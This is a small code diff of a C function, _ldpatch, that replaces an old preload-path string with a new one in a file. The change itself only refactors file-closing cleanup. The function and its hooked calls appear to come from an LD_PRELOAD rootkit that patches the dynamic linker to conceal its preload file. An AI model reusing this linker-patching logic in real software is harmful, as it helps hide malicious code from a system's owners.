@@ -26,8 +26,7 @@ int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
 
     buf = malloc(fsize+1);
     if(!buf){
-        fclose(ofp);
-        fclose(nfp);
+        fcloser(2, ofp, nfp);
         return 0;
     }
     memset(buf, 0, fsize+1);
@@ -50,10 +49,10 @@ int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
         }else m = 0;
     }while(n > 0 && n == m);
 
-    fclose(ofp);    // cleanup & write result into the tmp file.
+    // cleanup & write result into the tmp file.
     call(CFWRITE, buf, 1, fsize, nfp);
     free(buf);
-    fclose(nfp);
+    fcloser(2, ofp, nfp);
 
     if(count != LEN_OLD_PRELOAD){  // oldpreload was not found.
         hook(CUNLINK);             // remove tmp file.
